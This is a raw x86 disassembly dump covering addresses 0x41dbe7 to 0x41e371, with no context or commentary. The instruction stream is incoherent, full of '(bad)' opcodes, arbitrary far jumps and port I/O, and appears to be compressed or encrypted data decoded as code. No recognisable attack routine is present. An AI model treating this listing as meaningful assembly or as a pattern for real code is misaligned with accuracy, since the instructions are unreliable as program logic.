  41dbe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbe8:	enter  0xb3d2,0xbf
  41dbec:	pop    ss
  41dbed:	dec    edi
  41dbee:	gs mov dh,0x17
  41dbf1:	aad    0xd2
  41dbf3:	cli    
  41dbf4:	fisubr DWORD PTR [edx]
  41dbf6:	xor    bl,BYTE PTR [ecx+edi*1+0x30ea13c4]
  41dbfd:	jmp    0x74ca488
  41dc02:	sub    ebx,DWORD PTR [ebx+0x1032907e]
  41dc08:	add    eax,0xb075369b
  41dc0d:	lock int3 
  41dc0f:	or     al,0x83
  41dc11:	xor    cl,BYTE PTR ds:0xe4ce2736
  41dc17:	loop   0x41dbd6
  41dc19:	xor    al,0xc3
  41dc1b:	test   al,0xac
  41dc1d:	mov    esi,0x31189915
  41dc22:	mov    DWORD PTR [eax+0x72],ecx
  41dc25:	test   BYTE PTR [ebp+0x2842ecd3],dl
  41dc2b:	imul   ebp,DWORD PTR [edi+eax*4+0x6e5eda19],0xffffff89
  41dc33:	ror    al,cl
  41dc35:	jmp    0x9219:0xeb5f283c
  41dc3c:	fimul  DWORD PTR [eax-0x52]
  41dc3f:	mov    eax,ds:0x41cc3bf2
  41dc44:	data16 in al,0xc7
  41dc47:	xchg   DWORD PTR [ebx-0x78],edx
  41dc4a:	jo     0x41dc1f
  41dc4c:	aad    0xfe
  41dc4e:	sbb    esp,DWORD PTR [ecx+0x56]
  41dc51:	pushf  
  41dc52:	outs   dx,BYTE PTR ds:[esi]
  41dc53:	mov    esp,DWORD PTR [ebx-0x6fabb10b]
  41dc59:	inc    esp
  41dc5a:	arpl   WORD PTR [edi+esi*1+0x614684a8],di
  41dc61:	dec    edi
  41dc62:	cmp    bh,ah
  41dc64:	outs   dx,BYTE PTR ds:[esi]
  41dc65:	and    ah,dl
  41dc67:	push   0xbfb32e52
  41dc6c:	addr16 dec ebx
  41dc6e:	cmp    ebp,DWORD PTR [esi-0x681e0ae1]
  41dc74:	ins    BYTE PTR es:[edi],dx
  41dc75:	mov    ds:0x476ed49c,eax
  41dc7a:	push   ecx
  41dc7b:	xor    DWORD PTR [esi-0x44cc3ba7],ebx
  41dc81:	dec    ebp
  41dc82:	in     eax,dx
  41dc83:	cmp    al,0x95
  41dc85:	cmp    DWORD PTR [bp-0x2b],ebx
  41dc89:	repnz push ecx
  41dc8b:	sub    edi,DWORD PTR [esi+eiz*4-0x58]
  41dc8f:	ins    DWORD PTR es:[edi],dx
  41dc90:	loop   0x41dc65
  41dc92:	and    bh,ch
  41dc94:	out    0x8f,eax
  41dc96:	jp     0x41dcc1
  41dc98:	out    0xe0,eax
  41dc9a:	imul   eax,DWORD PTR [esi],0x66ac3bb7
  41dca0:	dec    eax
  41dca1:	ds mov dl,0xdc
  41dca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dca5:	loopne 0x41dce7
  41dca7:	xchg   ebx,eax
  41dca8:	sbb    al,0xc
  41dcaa:	and    eax,0x91a54b05
  41dcaf:	dec    edx
  41dcb0:	mov    bl,0xd5
  41dcb2:	mov    DWORD PTR [esi+0x2f],edi
  41dcb5:	dec    edx
  41dcb6:	mov    eax,ds:0xb09fc728
  41dcbb:	std    
  41dcbc:	push   0xa7e664f3
  41dcc1:	jb     0x41dc76
  41dcc3:	lahf   
  41dcc4:	cmp    ebp,DWORD PTR [esi+0x1e]
  41dcc7:	fidivr WORD PTR [edx-0x7b]
  41dcca:	cmp    edi,DWORD PTR [esi+edi*8]
  41dccd:	iret   
  41dcce:	cmp    al,cl
  41dcd0:	call   0xc37f:0x104c61b1
  41dcd7:	adc    BYTE PTR [edx+0x7a4ae3e4],dh
  41dcdd:	dec    ecx
  41dcde:	or     DWORD PTR [ecx-0x1c8d1168],edx
  41dce4:	jmp    0xe7c2c5e2
  41dce9:	mov    bh,0x44
  41dceb:	pop    eax
  41dcec:	xchg   esi,eax
  41dced:	push   ss
  41dcee:	pop    es
  41dcef:	es pop eax
  41dcf1:	mov    cl,0xa5
  41dcf3:	xchg   DWORD PTR [esi+0x3a],esp
  41dcf6:	fisttp QWORD PTR [eax]
  41dcf8:	push   ebp
  41dcf9:	adc    ch,BYTE PTR [edx]
  41dcfb:	(bad)  
  41dcfc:	fist   WORD PTR [ebx-0x7a]
  41dcff:	pop    esp
  41dd00:	mov    ?,WORD PTR [ebp+0x5]
  41dd03:	(bad)  
  41dd04:	imul   esi,DWORD PTR [edx+0x1],0x68
  41dd08:	push   edx
  41dd09:	mov    al,0x5d
  41dd0b:	sbb    ecx,DWORD PTR [esi+0x27]
  41dd0e:	pop    ss
  41dd0f:	bound  ebx,QWORD PTR [eax+0x5c8d64ff]
  41dd15:	and    DWORD PTR [ebx-0x21],ebp
  41dd18:	inc    ebx
  41dd19:	push   ss
  41dd1a:	cwde   
  41dd1b:	rcl    bl,1
  41dd1d:	out    dx,al
  41dd1e:	inc    ebx
  41dd1f:	add    ebx,DWORD PTR [edi-0xa]
  41dd22:	les    ebx,FWORD PTR [edi-0x25f3c4d1]
  41dd28:	leave  
  41dd29:	(bad)  
  41dd2a:	adc    bh,bh
  41dd2c:	jmp    0xca7389e7
  41dd31:	test   al,0xec
  41dd33:	inc    esi
  41dd34:	ret    0x5d85
  41dd37:	fadd   st(4),st
  41dd39:	repnz shr BYTE PTR [esp+esi*8],0x5f
  41dd3e:	push   ebp
  41dd3f:	(bad)  
  41dd41:	inc    ebx
  41dd42:	lock pop es
  41dd44:	and    BYTE PTR [ebx+0x1ff2530f],al
  41dd4a:	(bad)  
  41dd4b:	fwait
  41dd4c:	mov    WORD PTR [eax+0x1fade7ce],fs
  41dd52:	dec    esp
  41dd53:	aam    0x62
  41dd55:	je     0x41dd00
  41dd57:	mov    ebx,0x34bf0f68
  41dd5c:	xchg   esp,eax
  41dd5d:	add    al,0x3
  41dd5f:	mov    cl,0x55
  41dd61:	sbb    DWORD PTR [edi+edi*8],edi
  41dd64:	mov    eax,ds:0x9f48be76
  41dd69:	inc    esp
  41dd6a:	jnp    0x41dd8e
  41dd6c:	mov    WORD PTR [edx],gs
  41dd6e:	inc    eax
  41dd6f:	lea    edi,[ebp+esi*4-0x30]
  41dd73:	sahf   
  41dd74:	call   DWORD PTR [edi]
  41dd76:	rcl    BYTE PTR [ebx+0x1b0301b0],0x65
  41dd7d:	sti    
  41dd7e:	fnstenv [edi+0x37]
  41dd81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd82:	lock mov ecx,0x1cd68c42
  41dd88:	sbb    cl,BYTE PTR [ebp-0x42]
  41dd8b:	test   al,0xed
  41dd8d:	jbe    0x41dd1e
  41dd8f:	add    DWORD PTR [ebx-0x5b],edx
  41dd92:	sbb    esi,esi
  41dd94:	aam    0x53
  41dd96:	or     DWORD PTR [ebp-0x1b],eax
  41dd99:	and    esp,eax
  41dd9b:	mov    esi,0x7d6340f1
  41dda0:	add    cl,0x73
  41dda3:	cmp    eax,0x1c295b8b
  41dda8:	fisttp QWORD PTR [ecx+0x1b5d92e0]
  41ddae:	jne    0x41de11
  41ddb0:	dec    ebx
  41ddb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddb2:	mov    dl,0x26
  41ddb4:	adc    cl,ah
  41ddb6:	jns    0x41dd63
  41ddb8:	dec    ebp
  41ddb9:	mov    al,ds:0xa20d247
  41ddbe:	scas   eax,DWORD PTR es:[edi]
  41ddbf:	nop
  41ddc0:	call   0xe566:0x11550d1a
  41ddc7:	(bad)  
  41ddc8:	(bad)  
  41ddc9:	call   0x40d2:0x2d8a7d05
  41ddd0:	sti    
  41ddd1:	ins    DWORD PTR es:[edi],dx
  41ddd2:	fcmovnu st,st(3)
  41ddd4:	push   ss
  41ddd5:	xlat   BYTE PTR ds:[ebx]
  41ddd6:	cmp    al,BYTE PTR [ebp-0x26c23279]
  41dddc:	out    dx,al
  41dddd:	stos   BYTE PTR es:[edi],al
  41ddde:	imul   edi,DWORD PTR [edx],0x928653fa
  41dde4:	mov    BYTE PTR [ecx],dh
  41dde6:	sbb    eax,0x6bc09a90
  41ddeb:	iret   
  41ddec:	fs (bad) 
  41ddee:	out    dx,al
  41ddef:	pop    ds
  41ddf0:	imul   eax,DWORD PTR [esi+0x3bc522ed],0xb7c957ac
  41ddfa:	ret    
  41ddfb:	add    esi,ebx
  41ddfd:	mov    esp,0x71c8cae4
  41de02:	cld    
  41de03:	xor    DWORD PTR [ecx+ebx*1+0x31],ebx
  41de07:	in     eax,dx
  41de08:	loope  0x41dde6
  41de0a:	fcomp  QWORD PTR [esi+0x2ee2b01e]
  41de10:	sub    esi,DWORD PTR [edi+ebp*8-0x6f]
  41de14:	dec    ebx
  41de15:	ins    BYTE PTR es:[edi],dx
  41de16:	sbb    esi,ecx
  41de18:	(bad)  
  41de19:	je     0x41de61
  41de1b:	dec    esi
  41de1c:	(bad)  
  41de1d:	push   cs
  41de1e:	scas   al,BYTE PTR es:[edi]
  41de1f:	lds    ecx,FWORD PTR [eax-0x717fbf7]
  41de25:	repz push 0x6b
  41de28:	mov    ecx,0x325db4bf
  41de2d:	xlat   BYTE PTR es:[ebx]
  41de2f:	stos   DWORD PTR es:[edi],eax
  41de30:	daa    
  41de31:	daa    
  41de32:	dec    edx
  41de33:	fs (bad) 
  41de35:	imul   esi,ebx,0x7b0b455c
  41de3b:	stos   DWORD PTR es:[edi],eax
  41de3c:	int    0x54
  41de3e:	mov    ss,edi
  41de40:	mov    ?,WORD PTR [eax+0x7019c111]
  41de46:	jnp    0x41de26
  41de48:	inc    edi
  41de49:	xchg   esi,eax
  41de4a:	lea    ebx,[ebp+ebp*2-0x7379fa9e]
  41de51:	sub    al,0xda
  41de53:	mov    ds:0x348a50ee,al
  41de58:	cmc    
  41de59:	jo     0x41de3f
  41de5b:	es push cs
  41de5d:	mov    ah,0xed
  41de5f:	push   ax
  41de61:	mov    bl,BYTE PTR fs:[edi-0x28]
  41de65:	test   al,0xb3
  41de67:	xor    bh,BYTE PTR [edi+0x4]
  41de6a:	pop    edi
  41de6b:	mov    eax,0xc204339c
  41de70:	(bad)  
  41de72:	lds    ebp,FWORD PTR [ebp-0x43]
  41de75:	mov    BYTE PTR [ecx-0x1f],0x1a
  41de79:	(bad)  [eax]
  41de7b:	cdq    
  41de7c:	dec    edi
  41de7d:	scas   al,BYTE PTR es:[edi]
  41de7e:	cld    
  41de7f:	push   cs
  41de80:	(bad)  
  41de81:	les    esi,FWORD PTR [ecx+ebp*8]
  41de84:	lahf   
  41de85:	push   ss
  41de86:	fs push ss
  41de88:	shr    bl,0x2a
  41de8b:	in     eax,0x9b
  41de8d:	pop    ecx
  41de8e:	mov    al,ds:0x37ca5138
  41de93:	push   0x60
  41de95:	mov    ebx,0x1ae2a658
  41de9a:	cmc    
  41de9b:	shl    DWORD PTR [edx+0x31],0x77
  41de9f:	mov    edi,0xc03e2013
  41dea4:	scas   al,BYTE PTR es:[edi]
  41dea5:	xchg   edx,eax
  41dea6:	dec    edx
  41dea7:	out    0xc2,al
  41dea9:	leave  
  41deaa:	lock lods eax,DWORD PTR ds:[esi]
  41deac:	test   DWORD PTR [edx+ebx*2],edi
  41deaf:	das    
  41deb0:	sub    cl,BYTE PTR [eax]
  41deb2:	mov    al,0x11
  41deb4:	cli    
  41deb5:	lea    esi,[edi+0x3ab5365d]
  41debb:	stos   BYTE PTR es:[edi],al
  41debc:	sub    cl,BYTE PTR [edx+0xe686dfb]
  41dec2:	push   esp
  41dec3:	xor    DWORD PTR [ebx],0xffffffb6
  41dec6:	loop   0x41ded8
  41dec8:	sbb    BYTE PTR [ebx+0x7cdf95a7],al
  41dece:	mov    esi,0x7664b66a
  41ded3:	ins    DWORD PTR es:[edi],dx
  41ded4:	retf   0x3877
  41ded7:	fadd   st(0),st
  41ded9:	and    DWORD PTR [esi],0x885eb3fb
  41dedf:	push   eax
  41dee0:	mov    bl,0xc3
  41dee2:	inc    esi
  41dee3:	daa    
  41dee4:	push   cs
  41dee5:	fld    TBYTE PTR [ecx]
  41dee7:	jmp    DWORD PTR [ecx+0x50]
  41deea:	lea    esp,[eax+ebp*1]
  41deed:	in     eax,0x5c
  41deef:	call   0x9b7c:0x5b8052d7
  41def6:	iret   
  41def7:	cs jnp 0x41df74
  41defa:	xchg   esp,eax
  41defb:	pop    ecx
  41defc:	xor    al,0x5a
  41defe:	(bad)  
  41deff:	xor    ecx,DWORD PTR [edx-0x609446e5]
  41df05:	aad    0xd7
  41df07:	fcmovne st,st(5)
  41df09:	adc    al,0x98
  41df0b:	mov    ecx,DWORD PTR [eax+edi*4-0x33]
  41df0f:	jmp    0xcdf0dc1d
  41df14:	jbe    0x41df36
  41df16:	dec    edi
  41df17:	mov    WORD PTR [edi-0x7b0db8df],gs
  41df1d:	sbb    BYTE PTR ds:0x21376c2a,0xa2
  41df24:	test   al,0xac
  41df26:	into   
  41df27:	xchg   edx,eax
  41df28:	in     eax,dx
  41df29:	repnz dec ecx
  41df2b:	and    DWORD PTR [ebx-0x23],0xa01063d3
  41df32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df33:	ret    
  41df34:	fwait
  41df35:	push   esi
  41df36:	cmp    bl,ah
  41df38:	pop    eax
  41df39:	cmp    eax,0x4efc7a53
  41df3e:	leave  
  41df3f:	addr16 ffree st(2)
  41df42:	mov    ?,WORD PTR [ebx+0x39]
  41df45:	cwde   
  41df46:	mov    al,0xbb
  41df48:	or     BYTE PTR [esi+edi*2],dh
  41df4b:	sar    BYTE PTR [edx+0x20],0x69
  41df4f:	pushf  
  41df50:	sbb    ecx,DWORD PTR [edi+0x1592cf91]
  41df56:	in     eax,dx
  41df57:	mov    WORD PTR [ebx],es
  41df59:	test   eax,0xd8d58c47
  41df5e:	mov    bh,0xad
  41df60:	pop    ebp
  41df61:	mov    eax,gs
  41df63:	mov    bl,BYTE PTR [edx-0x620c7745]
  41df69:	call   0x90f5cd68
  41df6e:	frstor [ebx+eiz*4-0x7d]
  41df72:	sbb    DWORD PTR [ecx],esi
  41df74:	rcl    edx,0x5b
  41df77:	mov    cs:0xdba3b2e5,al
  41df7d:	adc    al,0x1
  41df7f:	call   0x49c727f2
  41df84:	ficom  DWORD PTR [ecx-0x7ab0477f]
  41df8a:	dec    edx
  41df8b:	outs   dx,DWORD PTR ds:[esi]
  41df8c:	push   esi
  41df8d:	aad    0xba
  41df8f:	xchg   edx,eax
  41df90:	jecxz  0x41e001
  41df92:	loopne 0x41dffd
  41df94:	cmp    esi,edi
  41df96:	fadd   QWORD PTR [eax-0x7b85db12]
  41df9c:	jecxz  0x41df99
  41df9e:	mov    bh,0xc7
  41dfa0:	mov    ecx,0x723e24c1
  41dfa5:	pop    edx
  41dfa6:	cld    
  41dfa7:	cmp    cl,BYTE PTR [esi-0x19b5f0a2]
  41dfad:	mov    WORD PTR [esi-0x2c],ss
  41dfb0:	icebp  
  41dfb1:	sar    BYTE PTR es:[ebp+ecx*2+0x7247310a],1
  41dfb9:	pusha  
  41dfba:	sub    DWORD PTR [esi+0x6d657889],edx
  41dfc0:	dec    edx
  41dfc1:	adc    al,0x46
  41dfc3:	xor    al,0xa8
  41dfc5:	test   al,0xca
  41dfc7:	mov    ah,0x46
  41dfc9:	jg     0x41df5f
  41dfcb:	cmp    BYTE PTR [ebp+0x298d6e48],dh
  41dfd1:	test   eax,0xdc9641e5
  41dfd6:	sub    al,cl
  41dfd8:	stos   BYTE PTR es:[edi],al
  41dfd9:	add    eax,esp
  41dfdb:	lock dec esp
  41dfdd:	push   0xffffffaf
  41dfdf:	inc    edi
  41dfe0:	adc    DWORD PTR [ecx*2-0xf72da1e],0x4b
  41dfe8:	xchg   esp,eax
  41dfe9:	test   al,0x61
  41dfeb:	and    eax,0xc8800567
  41dff0:	bt     DWORD PTR [ebp+0x19242eb9],ebp
  41dff7:	sbb    eax,0xff1921f1
  41dffc:	mov    al,ah
  41dffe:	mov    gs,WORD PTR [ebx]
  41e000:	repz jl 0x41df8c
  41e003:	sub    al,0xc8
  41e005:	int3   
  41e006:	div    edi
  41e008:	inc    edx
  41e009:	and    BYTE PTR [ebp-0x152ee055],bl
  41e00f:	pop    ss
  41e010:	cmp    eax,0x580bbc6
  41e015:	daa    
  41e016:	cmp    al,0x64
  41e018:	adc    al,0x84
  41e01a:	lea    edx,[edx-0x64]
  41e01d:	pop    ecx
  41e01e:	rcl    BYTE PTR [eax],cl
  41e020:	push   ebx
  41e021:	imul   esi,DWORD PTR [edx+0x5d91f1b1],0xc34ae7b5
  41e02b:	mov    al,0xae
  41e02d:	and    cl,BYTE PTR [ebx+eiz*1]
  41e030:	push   ss
  41e031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e032:	sahf   
  41e033:	xchg   DWORD PTR [edx],esi
  41e035:	retf   
  41e036:	lahf   
  41e037:	retf   0x1c8b
  41e03a:	jo     0x41e00d
  41e03c:	mov    BYTE PTR [edx],ah
  41e03e:	leave  
  41e03f:	adc    eax,0x5cdcb99f
  41e044:	pop    edi
  41e045:	sbb    esp,edi
  41e047:	sub    BYTE PTR [edi],cl
  41e049:	dec    esi
  41e04a:	out    dx,al
  41e04b:	pop    ecx
  41e04c:	cs jae 0x41e025
  41e04f:	xchg   BYTE PTR ds:0x5a843ad8,ch
  41e055:	mov    cs,WORD PTR [edx]
  41e057:	(bad)  
  41e058:	int    0x97
  41e05a:	cmp    BYTE PTR [ebx+0x32],ah
  41e05d:	add    DWORD PTR [eax],0x915f458d
  41e063:	ss enter 0xa99c,0x27
  41e068:	sti    
  41e069:	jbe    0x41e0a9
  41e06b:	test   dh,bh
  41e06d:	sub    DWORD PTR [esi+0x6b],esp
  41e070:	or     bh,BYTE PTR [ebp-0x5e2ed050]
  41e076:	and    al,0x25
  41e078:	loopne 0x41e0f9
  41e07a:	or     eax,0xadfbd0aa
  41e07f:	push   0xb21ff6c6
  41e084:	test   al,0xa6
  41e086:	leave  
  41e087:	pop    es
  41e088:	xchg   esi,eax
  41e089:	adc    al,0xc7
  41e08c:	xlat   BYTE PTR ds:[ebx]
  41e08d:	ja     0x41e09c
  41e08f:	mov    eax,0x5ed1d649
  41e095:	inc    esp
  41e096:	in     al,0xa6
  41e098:	loope  0x41e0e2
  41e09a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e09b:	inc    ebp
  41e09c:	cmp    cl,bh
  41e09e:	mov    WORD PTR [ecx],cs
  41e0a0:	dec    eax
  41e0a1:	ror    ebp,1
  41e0a3:	repnz imul edx,DWORD PTR [ecx+0x3c],0x7e82ee03
  41e0ab:	cs ja  0x41e03e
  41e0ae:	in     al,dx
  41e0af:	sub    edi,ecx
  41e0b1:	add    BYTE PTR [esi+0x20],dl
  41e0b4:	iret   
  41e0b5:	inc    edi
  41e0b6:	or     eax,0x273ac201
  41e0bb:	jb     0x41e08c
  41e0bd:	inc    ebp
  41e0be:	pushf  
  41e0bf:	clc    
  41e0c0:	stos   BYTE PTR es:[edi],al
  41e0c1:	aam    0x51
  41e0c3:	mov    dl,0x73
  41e0c5:	inc    ebp
  41e0c6:	fcomp  QWORD PTR [esp+edi*4+0x6554778]
  41e0cd:	xchg   BYTE PTR [edi+0x18],dl
  41e0d0:	mov    bl,0x5e
  41e0d2:	inc    ebp
  41e0d3:	into   
  41e0d4:	imul   ebp,ecx,0x64
  41e0d7:	es xchg esp,ecx
  41e0da:	ds jle 0x41e07f
  41e0dd:	ins    DWORD PTR es:[edi],dx
  41e0de:	inc    ecx
  41e0df:	jbe    0x41e15b
  41e0e1:	push   0xfffffff2
  41e0e3:	add    eax,0xcfeccaa4
  41e0e8:	push   esi
  41e0e9:	push   ebp
  41e0eb:	jno    0x41e162
  41e0ed:	or     esi,DWORD PTR [edx+0x6d]
  41e0f0:	mov    edx,DWORD PTR [ecx+0xc4a9921]
  41e0f6:	into   
  41e0f7:	je     0x41e135
  41e0f9:	xchg   ebp,eax
  41e0fa:	push   ds
  41e0fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0fc:	(bad)  
  41e0fd:	lea    ebp,[ebx+0x11]
  41e100:	push   0x22
  41e102:	aaa    
  41e103:	stc    
  41e104:	xchg   edi,eax
  41e105:	mov    eax,DWORD PTR [ecx]
  41e107:	add    al,0x1d
  41e109:	retf   0x2108
  41e10c:	loope  0x41e153
  41e10e:	sti    
  41e10f:	sub    bh,0xe7
  41e112:	arpl   WORD PTR [edx-0x175f26f0],sp
  41e118:	stos   BYTE PTR es:[edi],al
  41e119:	imul   ecx,DWORD PTR [edi+0x44],0x2c
  41e11d:	mov    al,ds:0x8df89549
  41e122:	ret    
  41e123:	xchg   BYTE PTR [eax+0x23f3dd08],ah
  41e129:	dec    esi
  41e12a:	and    ebp,DWORD PTR [esi+0x40]
  41e12d:	fscale 
  41e12f:	dec    ebx
  41e130:	adc    edx,DWORD PTR [ecx-0x5b]
  41e133:	mov    ebx,0x24262f6f
  41e138:	cli    
  41e139:	das    
  41e13a:	jbe    0x41e120
  41e13c:	sti    
  41e13d:	cmp    esi,DWORD PTR [ebx-0x75bc3d84]
  41e143:	lea    edx,[ecx+0x1b]
  41e146:	jne    0x41e0fb
  41e148:	xchg   edi,eax
  41e149:	hlt    
  41e14a:	dec    ebp
  41e14b:	mov    al,0x80
  41e14d:	sbb    DWORD PTR [edi],eax
  41e14f:	sbb    cl,BYTE PTR [edx-0x7d8e186]
  41e155:	mov    ds,WORD PTR [eax]
  41e157:	pop    es
  41e158:	push   ss
  41e159:	(bad)  
  41e15a:	in     eax,0xc0
  41e15c:	loopne 0x41e166
  41e15e:	sub    edx,esp
  41e160:	add    cl,dh
  41e162:	aas    
  41e163:	popa   
  41e164:	sbb    dh,bl
  41e166:	sahf   
  41e167:	daa    
  41e168:	jecxz  0x41e0fd
  41e16a:	and    ah,BYTE PTR [ebx+ebp*8-0x3f233f0a]
  41e171:	jmp    FWORD PTR ds:0xd6299c1f
  41e177:	gs and eax,0xce9efa2
  41e17d:	dec    edi
  41e17e:	sub    ah,0x3e
  41e181:	xchg   edi,eax
  41e182:	adc    al,0xf6
  41e184:	sbb    eax,0xdbe3a2a8
  41e189:	inc    esi
  41e18a:	mov    BYTE PTR [ebx+0x2aee9fd0],bh
  41e190:	imul   ecx,DWORD PTR [edx-0x63],0xffffff88
  41e194:	xchg   edi,eax
  41e195:	fistp  QWORD PTR [esi-0x68]
  41e198:	adc    ch,BYTE PTR [esp+eax*8+0x7a]
  41e19c:	adc    bl,BYTE PTR [eax+0x141333cd]
  41e1a2:	mov    BYTE PTR [ebp+0x2b9bf487],dl
  41e1a8:	push   eax
  41e1a9:	out    dx,al
  41e1aa:	mov    eax,0xbdc8ce49
  41e1af:	call   0x6ea1:0xf06512e5
  41e1b6:	sub    eax,0xac4dcec7
  41e1bb:	adc    ebp,DWORD PTR [edx-0x4e323f73]
  41e1c1:	xchg   ebx,eax
  41e1c2:	sahf   
  41e1c3:	stc    
  41e1c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1c5:	mov    ah,0x1e
  41e1c7:	test   DWORD PTR [esi],ebx
  41e1c9:	in     eax,dx
  41e1ca:	pusha  
  41e1cb:	leave  
  41e1cc:	aas    
  41e1cd:	jecxz  0x41e1de
  41e1cf:	xor    al,0xf6
  41e1d1:	mov    cl,0x33
  41e1d3:	and    al,0xe4
  41e1d5:	dec    esi
  41e1d6:	retf   0x51b3
  41e1d9:	in     eax,0xec
  41e1db:	test   eax,ebx
  41e1dd:	retf   0x7bfd
  41e1e0:	jmp    0x27c8abcc
  41e1e5:	jmp    0x41e205
  41e1e7:	push   ebp
  41e1e8:	xlat   BYTE PTR ds:[ebx]
  41e1e9:	mov    ds,ecx
  41e1eb:	push   ebx
  41e1ec:	std    
  41e1ed:	mov    ds:0xb24185d1,eax
  41e1f2:	add    ebx,DWORD PTR [eax-0x2ae39561]
  41e1f8:	mov    bl,0xd0
  41e1fa:	xchg   ebp,eax
  41e1fb:	jns    0x41e21a
  41e1fd:	cld    
  41e1fe:	cmp    BYTE PTR [ebp*8-0x98d62ad],bh
  41e205:	stos   DWORD PTR es:[edi],eax
  41e206:	aad    0xe7
  41e208:	test   DWORD PTR [ecx],0xa34b64dd
  41e20e:	inc    edi
  41e20f:	pop    esi
  41e210:	inc    ecx
  41e211:	rol    BYTE PTR [eax+0x74],1
  41e214:	push   esp
  41e215:	sar    bh,1
  41e217:	add    eax,0x84cfeacd
  41e21c:	jmp    0x41e29d
  41e21e:	ins    DWORD PTR es:[edi],dx
  41e21f:	lahf   
  41e220:	add    BYTE PTR [eax],al
  41e222:	add    BYTE PTR [eax],al
  41e224:	add    BYTE PTR [eax],al
  41e226:	push   cs
  41e227:	pop    esp
  41e228:	mov    esp,0xffe7fe47
  41e22d:	pop    ebp
  41e22e:	es mov eax,0xe3d3fe17
  41e234:	cmc    
  41e235:	loop   0x41e25e
  41e237:	fild   DWORD PTR [ecx]
  41e239:	add    BYTE PTR [edx],ah
  41e23b:	pop    es
  41e23c:	add    BYTE PTR [eax],al
  41e23e:	xchg   BYTE PTR [eax],dl
  41e240:	repz cmp eax,0xb99e46ce
  41e246:	push   ebx
  41e247:	mov    ch,0x95
  41e249:	or     esp,DWORD PTR [ebp-0x18]
  41e24c:	mov    edi,0x6e73ce8b
  41e251:	jns    0x41e2c2
  41e253:	clc    
  41e254:	jae    0x41e273
  41e256:	psadbw mm6,QWORD PTR [edi-0x56]
  41e25a:	das    
  41e25b:	lds    ebx,FWORD PTR [ecx-0x6d6a3c04]
  41e261:	sub    esp,DWORD PTR [esi+0x75]
  41e264:	rol    BYTE PTR [eax],1
  41e266:	sbb    BYTE PTR [esi+eax*4],ch
  41e269:	aad    0x3e
  41e26b:	ss mov edx,0xa1a4474
  41e271:	jp     0x41e24d
  41e273:	sbb    al,0xed
  41e275:	sub    bh,BYTE PTR [edx]
  41e277:	cvtps2pi mm2,QWORD PTR [ebp+0x4e80c62e]
  41e27e:	xchg   esi,eax
  41e27f:	mov    edx,0xe6accfd8
  41e284:	arpl   WORD PTR [edi-0x7e68ba98],di
  41e28a:	sub    al,0xdb
  41e28c:	xor    ch,BYTE PTR [ebx-0x4b359275]
  41e292:	sti    
  41e293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e294:	jg     0x41e28a
  41e296:	iret   
  41e297:	aad    0x37
  41e299:	stc    
  41e29a:	and    eax,0xb623e127
  41e29f:	fcmovnbe st,st(1)
  41e2a1:	cdq    
  41e2a2:	jns    0x41e275
  41e2a4:	cdq    
  41e2a5:	add    ebp,DWORD PTR [edi]
  41e2a7:	cmp    eax,0x699b3420
  41e2ac:	test   al,0xf9
  41e2ae:	das    
  41e2af:	and    al,0xa2
  41e2b1:	push   ebp
  41e2b2:	or     bl,BYTE PTR [ebx]
  41e2b4:	inc    esi
  41e2b5:	fmul   QWORD PTR [esi-0x64]
  41e2b8:	mov    ?,WORD PTR ds:0x17681356
  41e2be:	inc    ebp
  41e2bf:	xor    eax,0x7d865599
  41e2c4:	push   esi
  41e2c5:	stos   DWORD PTR es:[edi],eax
  41e2c6:	scas   al,BYTE PTR es:[edi]
  41e2c7:	enter  0x9964,0x64
  41e2cb:	xchg   edx,eax
  41e2cc:	xlat   BYTE PTR ds:[ebx]
  41e2cd:	mov    ebp,0x5df039ce
  41e2d2:	mov    eax,0xa54e74e8
  41e2d7:	test   al,0x1e
  41e2d9:	repz lahf 
  41e2db:	and    BYTE PTR [edi],0x9
  41e2de:	jmp    0x8ce0:0xb06a07ca
  41e2e5:	push   0xa12fbb36
  41e2ea:	hlt    
  41e2eb:	aaa    
  41e2ec:	mov    ebp,0xf6dae1d6
  41e2f1:	ds and ebx,edx
  41e2f4:	or     eax,0xf7d14700
  41e2f9:	sbb    DWORD PTR [edi-0x2],eax
  41e2fc:	aas    
  41e2fd:	pop    ebp
  41e2fe:	scas   eax,DWORD PTR es:[edi]
  41e2ff:	pop    ebx
  41e300:	or     dh,BYTE PTR [esi-0x56]
  41e303:	mov    esi,0xd254dc38
  41e308:	test   al,0xac
  41e30a:	xchg   esi,eax
  41e30b:	mov    bl,BYTE PTR [edi-0x62b6aac0]
  41e311:	sbb    edx,edi
  41e313:	dec    esi
  41e314:	ins    BYTE PTR es:[edi],dx
  41e315:	and    dl,BYTE PTR [esi-0x19a63efc]
  41e31b:	cli    
  41e31c:	mov    ebx,0x1835c18b
  41e321:	mov    ah,0xff
  41e323:	sahf   
  41e324:	xor    edx,0x7b9ad036
  41e32a:	jge    0x41e2b2
  41e32c:	push   ebx
  41e32d:	push   ds
  41e32e:	cdq    
  41e32f:	jg     0x41e37b
  41e331:	mov    ebp,0xb67883ab
  41e336:	sub    DWORD PTR [ebp-0x8],0x4ef070b
  41e33d:	les    ebx,FWORD PTR [ecx-0x7b]
  41e340:	(bad)  
  41e341:	push   ebx
  41e342:	mov    bl,0x5b
  41e344:	xchg   ebx,eax
  41e345:	and    al,0x9b
  41e347:	sahf   
  41e348:	adc    al,0x55
  41e34a:	sub    BYTE PTR [ecx-0x6a21378e],dl
  41e350:	les    ebp,FWORD PTR [ebp+0x5d1ee11b]
  41e356:	push   0xffffffde
  41e358:	push   es
  41e359:	stos   DWORD PTR es:[edi],eax
  41e35a:	xor    eax,0x6c896508
  41e35f:	push   cs
  41e360:	cmp    edx,DWORD PTR [ebx]
  41e362:	sahf   
  41e363:	jae    0x41e34c
  41e365:	sub    bh,BYTE PTR [ebx-0x30]
  41e368:	jecxz  0x41e3ac
  41e36a:	cdq    
  41e36b:	icebp  
  41e36c:	dec    ebx
  41e36d:	push   ss
  41e36e:	std    
  41e36f:	jae    0x41e2f1
  41e371:	rcr    DWORD PTR [ebp+0x51],cl
